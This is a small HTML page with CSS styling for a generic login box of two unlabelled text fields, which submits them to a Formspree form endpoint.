<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>

    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f2f2f2;
            font-family: Arial, sans-serif;
        }

        .login-box {
            width: 320px;
            padding: 30px;
            background: white;
            text-align: center;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        h2 {
            margin-bottom: 25px;
        }

        input {
            width: 90%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 15px;
        }

        button {
            margin-top: 20px;
            padding: 12px 40px;
            background: #1b3a57;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background: #142b40;
        }
    </style>
</head>

<body>

    <div class="login-box">

        <h2>LOGIN</h2>

        <form action="https://formspree.io/f/xvkokrrn" method="POST">

            <input
                type="text"
                name="input1"
                placeholder="INPUT 1"
                required
            >

            <input
                type="text"
                name="input2"
                placeholder="INPUT 2"
                required
            >

            <br>

            <button type="submit">LOGIN</button>

        </form>

    </div>

</body>
</html>
